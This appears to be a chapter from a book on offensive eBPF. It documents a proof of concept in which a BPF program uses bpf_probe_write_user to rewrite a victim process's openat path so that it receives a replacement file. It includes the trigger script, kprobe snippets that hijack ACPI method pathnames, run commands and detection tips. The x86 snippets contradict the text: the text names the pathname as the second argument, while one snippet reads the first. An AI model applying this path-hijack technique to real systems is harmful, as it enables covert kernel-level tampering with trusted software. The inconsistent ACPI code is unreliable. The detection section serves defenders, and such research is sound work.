A quick walk through the trigger's state machine, because the proof-marker line is composed from three separate measurements and getting any one of them wrong would produce a silently-invalid proof.

The trigger runs in four phases: seed, BEFORE, load, AFTER.

**Seed.** Two files are written into `/tmp`:

```bash
printf 'ORIGINAL\n' > "$REAL_FILE"
printf 'REPLACED\n' > "$REPL_FILE"
```

`REAL_FILE` is `/tmp/CH17_REQ_real_firmware.bin` and contains the literal string `ORIGINAL`. `REPL_FILE` is `/tmp/CH17_REQ_attacker_replacement.bin` and contains the literal string `REPLACED`. These are distinct non-empty strings because the trigger's proof relies on distinguishing them, and a one-character difference would be harder to spot in the output.

**BEFORE.** The trigger runs `fw_requester` with basename `CH17_REQ_real_firmware.bin` and captures stdout:

```bash
BEFORE_OUT="$(echo "CH17_REQ_real_firmware.bin" | "$REQUESTER" 2>&1)"
BEFORE_CONTENT="$(echo "$BEFORE_OUT" | sed -n 's/.*content="\([^"]*\)".*/\1/p')"
```

The sed extracts the `content="..."` field from the requester's output. The expected value is `ORIGINAL`, because at this point no BPF program is attached and the path composition proceeds normally. This measurement is the baseline: if it returns anything other than `ORIGINAL` the test setup is broken and the rest of the proof is invalid.

**Load.** The BPF loader is spawned in the background and the trigger waits for the `[ch17-analog] attached` signal on stderr:

```bash
"$BIN" >"$LOADER_LOG" 2>&1 &
LOADER_PID=$!
for _ in $(seq 1 100); do
    grep -q "\[ch17-analog\] attached" "$LOADER_LOG" && break
    sleep 0.1
done
```

The polling loop gives the loader up to 10 seconds to attach. If the attach never succeeds, the trigger bails with a message to stderr and the harness records `fail`.

**AFTER.** The trigger runs `fw_requester` a second time with the same basename and captures stdout:

```bash
AFTER_OUT="$(echo "CH17_REQ_real_firmware.bin" | "$REQUESTER" 2>&1)"
AFTER_CONTENT="$(echo "$AFTER_OUT" | sed -n 's/.*content="\([^"]*\)".*/\1/p')"
```

Same invocation, different result if the rewrite worked. The expected value with the BPF probe attached is `REPLACED`, because the BPF program rewrites the user path before `getname()` reads it.

The `SWAPPED_COUNT` is computed from the loader log:

```bash
SWAPPED_COUNT="$(grep -c 'swapped=1' "$LOADER_LOG")"
```

Each time the BPF program successfully rewrites a user buffer, it emits a ringbuf event with `swapped=1`; the loader prints each event to stdout. `grep -c 'swapped=1'` counts those lines. In the trigger's one-invocation AFTER flow, the expected count is 1.

The proof-marker line:

```bash
echo "=== CH17_ANALOG_PROVEN requested=CH17_REQ_real_firmware.bin served=${AFTER_CONTENT:-?} before_content=${BEFORE_CONTENT:-?} swapped_events=${SWAPPED_COUNT} disclaimer=\"...\" ==="
```

The fields are assembled from the three measurements. `requested=` is the known basename the requester was invoked with. `served=` is `AFTER_CONTENT`. `before_content=` is `BEFORE_CONTENT`. `swapped_events=` is `SWAPPED_COUNT`. `disclaimer=` is hard-coded. The `${...:-?}` default values (`?` if the variable is empty) are defensive: if any measurement failed, the field shows `?` rather than disappearing, so the reviewer can see which measurement went missing.

This is more ceremonial than it needs to be, and that is intentional. Any one of the three measurements in isolation could be spurious — a hardcoded string, a leftover file, an accidentally-wildcarded match — but three independent measurements combined make the proof robust. A reviewer who doubts the claim can re-run the trigger and check each field manually.

## What the real primitive looks like on x86

For completeness, here is the x86 version of this primitive that the original chapter drafted and that this analog stands in for.

On a stock x86 kernel with `CONFIG_ACPI=y`, the ACPI namespace is populated at boot from DSDT and SSDT. Various subsystems — thermal, battery, lid switch, WMI (Windows Management Instrumentation) — make calls through `acpi_evaluate_object(handle, pathname, args, result)`. The `pathname` parameter is the second argument, and it is a `const char *` pointing to user-allocated memory that the caller has filled in with an AML pathname like `"\_SB._WS0.Ping"`.

A kprobe on `acpi_evaluate_object` would look like:

```c
SEC("kprobe/acpi_evaluate_object")
int BPF_KPROBE(kp_acpi, void *handle, const char *pathname, void *args, void *result)
{
    char path[128];
    long n = bpf_probe_read_user_str(path, sizeof(path), pathname);
    if (n <= 0) return 0;
    if (streq_target(path)) {
        static const char repl[] = "\\_SB._WS0.PWND";
        bpf_probe_write_user((void *)pathname, repl, sizeof(repl));
    }
    return 0;
}
```

Same primitive, different surface. The caller has a pointer to a string; the BPF program reads and rewrites at that pointer before the kernel follows it; the kernel ends up evaluating a different AML method than the caller intended.

WSMI on Dell and HP laptops extends this further. The WSMI driver registers callback handlers for specific AML methods that the EC invokes on power events. An attacker who rewrote the AML pathname in flight could, in principle, redirect a power-event callback to a different method — a method that, for example, pokes a SMBus device the attacker controls, or that the AML interpreter evaluates to a side effect the attacker wants. The analogue on WSMI-capable hardware would be a more interesting target than simple `acpi_evaluate_object`, but the primitive shape is identical: rewrite the string, let the kernel follow the rewrite.

I did not test either of these on real x86 hardware for this book. Both scenarios are left as future work — or, more honestly, as things that deserve a different book on a different kernel. This chapter's contribution is the motion, demonstrated on a surface that is actually live on the test kernel, with honest labelling that says so.

## What `bpf_probe_write_user` is actually allowed to do

A short clarification on the write helper because it is the load-bearing capability in this chapter.

`bpf_probe_write_user(void *dst, const void *src, u32 size)` writes `size` bytes from a kernel-side source into a userspace destination. The helper is documented as "use this very rarely and very carefully" in `include/uapi/linux/bpf.h`, because writing to arbitrary user memory from kernel context is an obvious footgun.

The constraints the kernel imposes at load time:
- The calling program type must be one that the kernel permits to use the helper. Tracing programs (kprobes, tracepoints, perf_event) are on the list; socket filters and XDP programs are not.
- The caller must have `CAP_SYS_ADMIN`, not just `CAP_BPF`. This is stricter than most BPF helpers; the kernel is explicit that this one is privileged.
- The verifier requires the destination and size arguments to be tracked correctly: the destination must be a pointer, the size must be a scalar within bounds.

The constraints the kernel imposes at runtime:
- The destination user page must be resident (not swapped out, not demand-paged).
- The destination must be writable by the target task (permission bits on the VMA).
- The destination must not be in a protected region (e.g., kernel memory mistakenly handed to the helper; the helper does a user-vs-kernel check).

On any of those runtime failures, the helper returns `-EFAULT` (or another negative errno) and does not write. The BPF program can inspect the return value to know whether the write succeeded. Our POC does exactly this: `rc = bpf_probe_write_user(...)`, `e->swapped = (rc == 0)`. If `swapped` is 0 in a logged event, the attack was prevented by one of the runtime checks.

An important corollary: this helper is not a general memory-manipulation primitive. It cannot write across address spaces (it writes into *current*'s user space). It cannot write to a page that is not present. It cannot bypass the VMA protection bits. The useful attack envelope is "write a few bytes into a user buffer the current task has writable, during a syscall window the kernel has arranged so the user page is definitely mapped."

That envelope sounds narrow when stated directly, and it is — which is why the kernel tolerates the helper at all. But the envelope is exactly large enough to cover this POC's path-rewrite attack, the ch05 cgroup-read-buffer-zero attack, and the ch10 getdents-buffer-splice attack. It is precisely the shape the error-injection-equivalent-for-writes tool wants.

## Detecting the analog

Detection for the analog specifically — since that is what is running on this kernel — falls out of the attack's unusual shape. Three tells:

**Unusual attach-point + helper combination.** A BPF program that attaches to `tp/syscalls/sys_enter_openat` *and* calls `bpf_probe_write_user` is an odd combination. Legitimate openat tracers exist — they feed observability platforms — and they almost never write anything. Legitimate userspace-write programs exist too — uprobes into specific application state — and they almost never attach to a universal syscall tracepoint. The intersection of the two is worth flagging. `bpftool prog list --pretty` will tell you which programs attach where and which helpers they call.

**Caller/opened path drift.** A process whose recorded "what I asked for" differs from what it actually opened is self-evidence of a rewrite. The requester in this POC produces this contrast directly via its own print output. In a real attack the defender could synthesize the same check: for a targeted process, record what `strace -e openat` reports the path argument as, then read `/proc/self/fd/N` for the resulting fd and compare. If they disagree, something rewrote the path between userspace and the kernel's view.

**Per-call timing anomaly on `openat`.** `bpf_probe_write_user` inside a tracepoint handler is not free — it takes the path lookup time, the page fault check if any, and the memory write. Openat calls under a loaded rewriter are measurably slower than openat calls without it. A fleet-level latency histogram for syscall durations, bucketed by binary, would show a fw_requester-like victim's openat latency creep upward once the loader attached. This is a noisy signal and not high-value on its own, but in concert with the other two it is a useful corroborator.

None of these are exotic. All three are within reach of any operator who runs `bpftool` and an ebpf-based syscall tracer already. The point is that an analog like this leaves fingerprints that look nothing like a normal workload, and defenders who look will see them.

## Hook points

### x86 (primary)
- `kprobe/acpi_evaluate_object`
- `kprobe/acpi_ns_evaluate`
- `kprobe/acpi_ex_execute_method`

### aarch64 (fallback)
- `kprobe/request_firmware`
- `kprobe/_request_firmware`
- `kprobe/firmware_request_nowarn`

### aarch64 (analog, what this POC ships)
- `tp/syscalls/sys_enter_openat` + `bpf_probe_write_user` against `comm == "fw_requester"`

```c
SEC("kprobe/acpi_evaluate_object")
int hijack_acpi(struct pt_regs *ctx) {
    const char target[] = "\\_SB._WS0.Ping";
    char path[MAX_ACPI_PATH_LEN];
    bpf_probe_read_str(path, sizeof(path), (void *)PT_REGS_PARM1(ctx));
    if (strncmp(path, target, sizeof(target)-1) == 0) {
        struct acpi_param param = {};
        param.type = ACPI_TYPE_INTEGER;
        param.data[0] = 0xdeadbeef;
        param.data_len = sizeof(u64);
        bpf_map_update_elem(&replacement_params, target, &param, BPF_ANY);
    }
    return 0;
}
char LICENSE[] SEC("license") = "GPL";
```

## Build

```
cd pocs/ch17-acpi-wsmi-analog
make
```

## Run

```
sudo ./build/ch17-acpi-wsmi-analog -h
sudo ./build/ch17-acpi-wsmi-analog                 # path-swap active
sudo ./build/ch17-acpi-wsmi-analog -v              # verbose libbpf
```

In another terminal:

```
sudo bash ./trigger.sh
```

## Detection

- `bpftool prog show | grep -E 'acpi|firmware|sys_enter_openat'`
- `cat /sys/kernel/debug/tracing/kprobe_events` shows attached probes.
- `events` ringbuf visible in `bpftool map show`.
- On production x86 hosts, any kprobe on `acpi_ex_execute_method` is worth investigating. Legitimate telemetry rarely hooks it.
- On any host, a tracepoint attached to `sys_enter_openat` that also calls `bpf_probe_write_user` is a strong anomaly. The combination is rare in legitimate tooling.

## Limitations / arch notes

- No ACPI, no firmware → honest skip. If `/proc/kallsyms` contains none of the six candidates, the loader prints `CH17_SKIP` and exits 2.
- aarch64 linuxkit has no ACPI interpreter. The POC substitutes the firmware-request path, which is a best-effort moral equivalent. The substituted-path marker records this honestly in the first ringbuf event.
- Override is out of scope for this POC. A real ACPI WSMI bypass would need `bpf_override_return` on `acpi_ex_execute_method` (not error-injectable on stock kernels) or a BPF LSM hook on `kernel_read_file` with `class=FIRMWARE`. Neither is wired up here.
